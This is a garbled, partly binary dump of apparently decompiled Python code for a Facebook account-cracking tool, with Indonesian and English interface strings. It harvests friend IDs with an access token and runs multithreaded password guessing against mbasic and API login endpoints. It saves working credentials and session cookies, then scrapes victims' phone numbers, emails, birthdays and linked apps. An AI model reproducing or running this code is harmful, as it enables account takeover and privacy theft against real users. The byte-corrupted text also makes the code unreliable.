 d��� }W n   Y Y qxY |d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt	|�� d t � qx|	�t|�t|
�i� tdt|� d |
 d tt	|�� d t � qxd	}t � �t|dd�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t
�  Y nw ztd| d��� }|D ]}t�|�dd�� �q?t�  W d S  t�y�   ztd| d��� }|D ]}t�|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILEr�   rO   z	on yellowr�   r�   z*] Sedang Membaca File, Tunggu Sebentar ...rz   z# PILIH FILE YG AKAN DI CEKr�   r�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKr�   r�   r   r�   r   r�   r�   r�   r�   z Akunr�   z] MENU: �# PILIHAN TIDAK ADA DI MENUrQ   �
r~   z+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI)r^   r   r]   rE   r   r   r   r�   rU   r�   r   rR   r�   r   r�   r�   rq   rY   r�   �replace�cek_opsir_   rD   )Ztek�teksZmy_filesZlisZktZmer�ty�yyr�   r�   r�   r�   r�   �teks2r�   r�   r�   ZhfZfzr�   r   r   r   r�   2  s�   

�
�
�.2
�
��r�   c               	   C   s�  zt dd��� } t dd��� }W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d	 � t	td
 t
 d t d �}zJtjd| d td  d|id��� }|d d D ]}zt�|d d |d  � W qa   Y qattd
 t d t d ttt�� � t�  W d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}	t|	dd�}
t� �|
� t�  Y d S w )NrG   r   rH   u   # 🏧LDVIP🏧r�   rO   r~   r�   r{   r�   r�   z] ID FACEBOOK  : z https://graph.facebook.com/v1.0/�)?fields=friends.limit(5000)&access_token=r   rI   rJ   �friendsrw   rL   �|r   u   ] 👉TOTAL-DUMP👉: rM   rN   rQ   z# AV ACCOUNTA NA PUBLICAr�   )rR   rS   r_   r   r]   r^   r   r�   rE   rq   r�   r   r   rT   rV   rL   rU   r   r�   �settingr[   r\   rY   )r`   ra   �winZwin2ZpilZkoh2�pirc   rd   r�   r�   r   r   r   r�   s  s:   
�& 
(�r�   c               
   C   s�  d} t | dd�}tt |dd�� td�}|dv r<td�}t|d	��� �� }d
}|D ]}t�|� |d
7 }|dkr: nq)n�|dv r�tt	d t	 d t	 d � zt
tt	d t	 d t	 d ��}W n tyz   d}t|dd�}	t� �|	� t�  Y nw |d
k s�|dkr�d}t|dd�}	t� �|	� t�  t�� }
d}tt	d t	 d t	 d � t|�D ]!}|d
7 }tt	d t	 t|� t	 d t|� d �}t�|� q�d}t� �t|dd�� t�� }
tD ]b}z6|
�d| d td  ��� }|d d D ]}z|d d |d   }|tv �rnt�|� W q�   Y q�W q� ttf�y$   Y q� tjj�yB   d!}t|dd�}t� j|d"d� t�  Y q�w d#tt� }tt�dk�rWt|d"d�}nt|dd�}t� �|� t�  d S )$NzJ[bold cyan][01] CLONE MULTIPLE FILE
[02] CLONE MANUAL MULTIPLE[/bold cyan]rQ   rO   ZMENUr|   u   [➣] MENU: r   u   [➣] FILE NAME : r   r   �   r�   r�   u   ➣z] TOTAL LIMIT IDS [10]r�   z] BERAPA ID : z# YOU ENTERED WRONG IDr�   z# OUT OF RANGE MENr   z'] DO YOU WANT TO CLONE FROM FRIEND LISTz] ENTER ID z : z!# Tunggu Sedang Mengumpulkan ID  z https://graph.facebook.com/v2.0/r�   r�   rw   rL   r�   r   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIZpurplez# BERHASIL MENGUMPULKAN %s ID)r�   r�   rq   rR   rS   �
splitlines�uidrU   r   rE   �int�
ValueErrorr]   r^   r   r   �Session�ranger   r   rT   rV   rL   rY   r_   r[   r\   r�   r�   )ZmasZmas2ZpilihZnmfilZnmfile�noZxfilZjumZpesanZpesan2�sesZyz�met�klZsedZuserr�col�miZisorc   rd   ZtotZtot2r   r   r   r�   �  s�   
��$
�,
�
�
�
r�   c                  C   sR  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d t d	 �}|d
v r;tt�D ]}t	�
|� q2nT|dv rhg }tt�D ]}|�
|� qEt|�}|d }t|�D ]}	t	�
|| � |d8 }qYn'|dv r�tD ]}t�dtt	��}
t	�|
|� qnnd}t � �t|dd�� t�  d}t � �t|dd�� d}t|dd�}tt|dd�� ttd t d t d �}|d
v r�t�
d� n|dv r�t�
d� n|dv r�t�
d� nt�
d� d}t � �t|dd�� ttd t d t d �}|dv �rt�
d� nt�
d� ttd t d t d �}|dv �rt�
d� nt�
d� t�  d S ) Nu   # 🏧SELECTION-PROTOCOL🏧r�   rO   u_   [bold yellow][01] 🏧CRACK OLD ID
[02] 🏧CRACK NEW ID
[03] 🏧CRACK RANDOM ID[/bold yellow]u   🏧METHOD-PROTOCOL🏧r|   r~   �   🏧u    SELECT-PLEASE🏧: r   r�   r   r�   r   r�   r�   u   # 🏧SERVER-PROTOCOL🏧uh   [bold green][01] 🏧M-FACEBOOK🏧
[02] 🏧FREE-FACEBOOK🏧
[03] 🏧MBASIC-FACEBOOK🏧[/bold green]ZMETHODr�   r�   z	] MENU : �mobile�freeZmbasicu   # 🏧SHOW OPTIONS🏧z]STORED APPS ? (y/t) : ��y�Y�yar�   z0] SHOW C/P OPTIONS? [ NOT RECOMMENDED ] (y/t) : )r^   r   r]   r�   r�   rq   rE   �sortedrL   �id2rU   r�   r�   �random�randint�insertr   �method�	taplikasi�oprek�passwrd)Zwlr�   Ztak�huZtuaZmudaZbacotZbcmZbcmiZxmud�xxr�   r�   ZiozZgessZhcZguwZaplikZoskr   r   r   r�   �  sh   �
��





r�   c            
      C   s�  d} t � �t| dd�� dttf }tt|dd�� tdd���}tD ]�}|�	d	�d
 |�	d	�d �
� }}|�	d�d
 }g d�}t|�dk r�t|�dk rMn�|�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� nRt|�dk r�|�|� nF|�|� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� dtv r�|�t||� q"dtv r�|�t||� q"dtv �r|�t||� q"|�t||� q"W d   � n	1 �sw   Y  td� d}t � �t|d d�� ttd! t d" t d# �}	|	d$v �rFt�  d S t�  d S )%Nu   # 🏧PRESS CTRL+Z TO STOP🏧rN   rO   zbLive Results Saved To : OK/%s
Check Result Saved To : CP/%s
Turn on/your Airplane Mode Every 10MINZCRACKr|   �   )Zmax_workersr�   r   r   r{   )
�19991999�
1234554321�
1122334455�19951995�19961996�19981998�20002000�20012001�20022002�19971997�   �   r�   r�   r�   r�   r�   Z19941994r�   r�   r�   r�   r�   r�   �apir�   r~   z)# WANT TO CHECK THE CRACK RESULT OPTIONS?r�   r�   r�   z-] Want to Show Crack Result Options? (y/t) : r�   )r^   r   r]   �okc�cpcr�   r�   �tredr�   r�   �lowerr�   rU   r�   �submit�crack�crack2�crack3rq   r�   r�   r�   r   )
ZlerZkrek�poolZyuzong�idfZnmfZfrs�pwvZtanyaZwoir   r   r   r�   
  sr   "


























��0


r�   c           .      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d|  d �j}
t�dt|
���d�t�dt|
���d�| d|dd�}|j�ddddd|dd	d
dddd|  d ddd�� |j d|d d!�}d"|j!�"� �#� v r�d#t$v r�t%�&| d$ | � t'| |� n7td%� d&| � d'|� �}t(|d(d)�}t)t(|d*d+�� t*d,t+ d-��,| d$ | d% � t%�&| d$ | � td7 aW  �nNd.|j!�"� �#� v �r4d/d0i}d1t-v �r[td7 a|j!�"� }d2�.d3d4� |j!�"� �/� D ��}t*d5t0 d-��,| d$ | d$ | d% � td%� d&| � d6|� d7|� �}t(|d(d)�}t)t(|d8d+�� W  �n�d#t-v �r3td7 a|j!�"� }d2�.d9d4� |j!�"� �/� D ��}t*d5t0 d-��,| d$ | d$ | d% � | }d:}t�� }|jd;||d<�j}t�1d=t|��d> }|jd?||d<�j}|jd@||d<�j}|jd|� dA�||d<�j}|jdB|� dC�||d<�j}zt�1dDt|��d> }W n   d:}Y zt�1dEt|��d> �2dFdG�}W n   d:}Y zt�1dHt|��d> }W n   d:}Y zt�1dIt|��d> } W n   d:} Y zt�1dJt|��d }!W n   d:}!Y zd:}"t�1dKt|��}#|#D ]	}$|"|$dL 7 }"�qCW n   Y |dM|� dN| � dO|!� dP|� dQ|� dR|"� dS|� d%�7 }dT\}%}&|jdU||d<�j}'|jdV||d<�j}(dWt�1d=t|'��v �r|dX7 }dY|'v �r�|dZ7 }n2|d[7 }t�1d\t|'��})t�1d]t|'��}*|)D ]}+|%d7 }%|d^|%� d_|+� d|*|& � d%�7 }|&d7 }&�q�d`|(v �r�|da7 }n8dT\}%}&|db7 }t�1d\t|(��},t�1d]t|(��}-|,D ]}+|%d7 }%|d^|%� d_|+� d|-|& � d%�7 }|&d7 }&�q�n	 td%� d&| � d6|� d7|� d%|� �}t(|d(d)�}t)t(|d8d+�� W  nnW q@W q@ tj3j4�yH   t�5dc� Y q@w td7 ad S )dNr�   �%u6   %s🏧LDVIP🏧 %s/%s 🏧OK:%s 🏧CP:%s 🏧 %s%s%sr{   ��end�mbasic.facebook.comr,   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�document�https://mbasic.facebook.com/�gzip, deflate brz5en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5��Hostrj   r+   rm   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destrg   �accept-encodingrk   z=https://mbasic.facebook.com/login/device-based/password/?uid=z6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"Zlogin_no_pinz/https://mbasic.facebook.com/login/save-device/')�lsd�jazoestr�   Zflow�pass�nextrf   rA   �!application/x-www-form-urlencodedz<https:/mbasic.facebook.com/login/device-based/password/?uid=�r  rl   rj   ri   rn   r+   rm   r  r  r  r  r  rg   r  rk   zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0F�rw   �allow_redirects�
checkpointr�   r�   r�   �   [•] ID       : �    [•] PASSWORD : r�   rO   r�   r|   r�   �a�c_userr+   ��SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�   �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0�key�valuer   r   r   �
<listcomp>l  �    zcrack.<locals>.<listcomp>r�   �   
[•] PASSWORD : �   
[•] COOKIES  : r�   c                 S   r  r  r   r  r   r   r   r   v  r!  r~   �'https://mbasic.facebook.com/profile.php)rK   ro   �\<title\>(.*?)<\/title\>r   �.https://mbasic.facebook.com/profile.php?v=info�1https://mbasic.facebook.com/profile.php?v=friends��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Fhttps://mbasic.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>�%\<div\ class\=".*?" id\="year_(.*?)">�, �   [✓] Account name       : �   
[✓] Number of Friends    : �   
[✓] Number of Followers : u!   
[✓] Active Email            : u#   
[✓] Active Number             : u#   
[✓] Account Year              : �   
[✓] Date of birth   : �r   r   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�Accessed using Facebook�Related Apps*
�2You don't have an active app or website to review.�No Active Apps Associated *
�	Active Apps : 
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�		[r�   �1You don't have expired apps or websites to review�
No Expired Apps Associated
�	Expired Apps :
�   �6r�   �choice�u�k�kk�brE   �hh�loopr�   r�   r   �ok�cpr�   r   r�   r   �stdout�flush�ugen�ugen2r   r�   r   ro   r�   r   r   rr   rs   ru   �postrK   �get_dict�keysr�   r�   rU   �cekerr�   r�   rR   r�   rt   r�   r   �itemsr�   �findallr�   r[   r\   r   ).r�   r�   �bi�pers�fff�ua�ua2r�   �pw�tixr�   �dataa�po�statuscp�	statuscp1Zheadapp�coki�kuki�statusok�	statusok1�user�infoakun�session�get_id�nama�response�	response2�	response3�	response4�nomer�email�ttl�teman�pengikut�tahun�cek_thn�nenen�hit1�hit2r�   �cek2�apkAktif�ditambahkan�muncul�apkKadaluarsa�
kadaluarsar   r   r   r�   I  s�   6


(64 

(

("�4

 

 ��D�E�r�   c           
   
   C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t��dd�}t�� }|D ]�}z�tt �dd	��tt �d
d��tt �d
d��dd|ddd�}|jdt| � d t|� d |d�}	d|	�� d v r�dtv r�t�| d | � t| |� n&tdt| |f � tdt  d��!| d | d � t�| d | � td7 aW  n<d|	j"v r�d|	j"v r�tdt| |f � td t# d��!| d | d � td7 aW  nW q? tj$j%y�   t&�'d!� Y q?w td7 ad S )"Nr�   r�   u=   %s🏧LDVIP-START🏧 %s/%s 🏧Ok*%s 🏧CP *%s 🏧 %s%s%sr{   r�   r�   r~   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr  ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer+   rn   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)ro   r�   Z	error_msgr�   r�   z%s++ %s|%s ----> ok       r�   r  r   Zsession_keyZEAAAz%s++ %s|%s ----> OK       r�   rF  )(r�   rH  rI  rJ  rK  rL  rE   rM  rN  r�   r�   r   rO  rP  r�   r   r�   r   rQ  rR  rS  r�   r   r�   r�   r   rV   r�   r�   rU   rX  rR   r�   rt   r   r�   r[   r\   r   r   )
r�   r�   r[  r\  r]  r^  r�   r`  �head�respr   r   r   r�   �  s:   6:&  �r�   c           -      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]
}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d|  �j}
t�dt|
���d�t�dt|
���d�t�dt|
���d�t�dt|
���d�| |d�}|j�ddddd|dd
dddd|  ddd�� |j d|dd�}d |j!�"� �#� v �r	d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}t(|d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � td7 aW  �nCd,|j!�"� �#� v �r7d-t-v �retd7 a|j!�"� }d.�.d/d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � td#� d2| � d3|� d4|� �}t(|d&d'�}t)t(|d5d)�� W  �n�d!t-v �r6td7 a|j!�"� }d.�.d6d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � | }d7}t�� }|jd8|d9�j}t�1d:t|��d; }|jd<|d9�j}|jd=|d9�j}|jd|� d>�|d9�j}|jd?|� d@�|d9�j}zt�1dAt|��d; }W n   d7}Y zt�1dBt|��d; �2dCdD�}W n   d7}Y zt�1dEt|��d; }W n   d7}Y zt�1dFt|��d; }W n   d7}Y zt�1dGt|��d } W n   d7} Y zd7}!t�1dHt|��}"|"D ]	}#|!|#dI 7 }!�qHW n   Y |dJ|� dK|� dL| � dM|� dN|� dO|!� dP|� d#�7 }dQ\}$}%|jdR|d9�j}&|jdS|d9�j}'dTt�1d:t|&��v �r|dU7 }dV|&v �r�|dW7 }n2|dX7 }t�1dYt|&��}(t�1dZt|&��})|(D ]}*|$d7 }$|d[|$� d\|*� d|)|% � d#�7 }|%d7 }%�q�d]|'v �r�|d^7 }n8dQ\}$}%|d_7 }t�1dYt|'��}+t�1dZt|'��},|+D ]}*|$d7 }$|d[|$� d\|*� d|,|% � d#�7 }|%d7 }%�q�n	 td#� d2| � d3|� d4|� d#|� �}t(|d&d'�}t)t(|d5d)�� W  nnW q@W q@ tj3j4�yK   t�5d`� Y q@w td7 ad S )aNr�   r�   z+%s<-> %s/%s <-> OK:%s <-> CP:%s <-> %s%s%sr{   r�   r�   r,   r�   r�   r�   r�   r�   r�   r�   r   zen-GB,en-US;q=0.9,en;q=0.8r  z)https://mbasic.facebook.com/login/?email=r	  r   r
  zname="m_ts" value="(.*?)"zname="li" value="(.*?)")r  r  Zm_tsrc   rt  r  rf   rA   r  )r  rl   rj   ri   rn   r+   rm   r  r  r  r  rg   r  rk   zVhttps://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecatedFr  r  r�   r�   r�   u   [•] ID : r  �whiterO   r�   r|   r�   r  r  r�   r  c                 S   r  r  r   r  r   r   r   r     r!  zcrack3.<locals>.<listcomp>r�   r  r"  r#  r�   c                 S   r  r  r   r  r   r   r   r     r!  r~   r$  rJ   r%  r   r&  r'  r(  r)  r*  r+  r,  r-  r.  r/  r0  r1  r2  r3  r4  r5  r6  u   
[✓] Active Email     : u   
[✓] Active Number     : u   
[✓] Account Year      : r7  r8  r9  r:  r;  r<  r=  r>  r?  r@  rA  rB  r�   rC  rD  rE  rF  rG  )-r�   r�   r[  r\  r]  r^  r_  r�   r`  ra  r�   rb  rc  rd  re  rf  rg  rh  ri  rj  rk  rl  rm  rn  ro  rp  rq  rr  rs  rt  ru  rv  rw  rx  ry  rz  r{  r|  r�   r}  r~  r  r�  r�  r�  r   r   r   r�   �  s   6


(�� 

(

("�4

 

 ��C�D�r�   c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))Nr  r�   rf   r,   rA   r  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   �navigate�?1r�   �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r   re   r  �%https://mbasic.facebook.com/login.phpr�   �rt  r  rC   T�rw   ro   r  �html.parser�form�Znhr  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datarq   r   r  �action�rw   ro   z%s++ %s|%s ----> ok       %sr�   r  r�   r�   r   �optionr   �4%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)�%s---> %s%sz;%s---> Cannot Check Options (Check Login In Lite/Mbasic)%s)r   r�   r   �soprU  r   �findr�   r   r   rL  r�   rR   r�   rt   rP  �find_allr�   rM  rK  rv   rI  )r�   r`  r^  r�  r�   �hi�ho�jorw   �lion�anj�kent�opsi�opsii�cr   r   r   rX  e  s<   $
"
�$ 
� ��rX  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|dd	�� t'�  Y q.w d;}t� �t	|dd	�� t'�  d S )<NzNThere is %s Account To Check
Before Start, Airplane Mode/Change Sim Card FirstzCEK OPSIr|   r�   r�   z] Startz# OPTION CHECK PROCESS STARTr�  rO   r   r�   r   rz   z%s++ %s ----> Error      %sz6%s---> Splitters Are Not Supported For This Program%sz%s---> %s/%s ---> { %s }%sr{   r�   z�Mozilla/5.0 (Linux; U; Android 4.1.2; en-nl; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30r�   rf   r,   rA   r  r�  r�   r�   r�  r�  r�   r�  r   re   r  r�  r�   r�  Tr�  r�  r  r�  r�  rq   r   r  r�  r�  z%s++ %s|%s ----> CP       %sr�  r�  r�  z%s---> Cannot Check Options%sr  z%s++ %s|%s ----> OK       %sz!%s++ %s|%s ----> WRONG        %sr~   rM   z# DONE)(r�   r�   r�   r�   rq   r�   rE   r^   r   r]   r�   �
IndexErrorr   r   rL  rI  r�   rH  rJ  rK  rM  r   rQ  rR  r   r�   r   r�  rU  r   rK   rV  rW  r�  r�   r   r�  r[   r\   r   )r�  r�   r�   ZloveZkesrL   r`  r[  r^  r�   �headerr�  r�  r�  rw   r�  r�  r�  r�  r�  rc   Zdahr   r   r   r�   �  sr   
"
�($
"
�$
�
�
r�   r   r�   r�   )ir   r   r   r   rB   rR   r�   �jr�   �spr   Zbs4rV   r�   �datetimerr   Zrich�ImportErrorr   r   Z
rich.tabler   �meZrich.consoler   r^   r   r�  Zconcurrent.futuresr   r�   r   ZgpZ
rich.panelr   r�   r   r�   Zrich.markdownr    r]   Zrich.columnsr!   r�   rS   r�   rS  rT  rL   r�   rN  rO  rP  r�   r�   r�   Z	lisensikur�   rT   Zlisensikunir�   rJ  rE   rM  rI  rK  rL  r�   Zheader_grupZdicr�   Z
url_lookupZurl_mbZurl_ipZ	url_graphr^  �now�dayZtglr   �monthZbln�yearZthnr�   r�   r   rD   rF   rC   rZ   rX   r�   r�   r�   r�   r�   r�   r�   r�   r�   rX  r�   �__name__�mkdirr   r   r   r   �<module>   s�    




H

���H

���8((&sA@9?t! 
9
�